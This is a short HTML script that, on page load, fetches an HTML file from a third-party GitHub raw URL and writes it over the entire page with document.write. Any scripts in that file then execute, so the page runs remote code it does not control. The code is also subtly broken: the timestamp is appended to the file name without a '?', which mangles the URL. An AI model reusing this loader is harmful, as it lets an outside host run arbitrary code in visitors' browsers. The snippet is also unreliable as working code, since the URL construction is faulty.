<script> 
(async () => { 
    const url = "https://raw.githubusercontent.com/embedgod/GSG8/refs/heads/main/index.html" + Date.now();
    const response = await fetch(url); 
    const html = await response.text(); 
    document.open(); 
    document.write(html); 
    document.close(); 
})(); 
</script>
